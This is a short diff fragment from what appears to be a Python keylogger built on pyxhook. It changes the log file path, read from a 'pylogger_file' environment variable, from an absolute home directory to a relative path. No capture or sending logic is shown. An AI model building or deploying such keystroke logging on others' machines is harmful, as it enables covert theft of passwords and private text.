@@ -3,7 +3,7 @@ import pyxhook
 
 log_file = os.environ.get(
     'pylogger_file',
-    os.path.expanduser('/home/arch/Workspace/file.log')
+    os.path.expanduser('../Workspace/file.log')
 )
 
 cancel_key = ord(
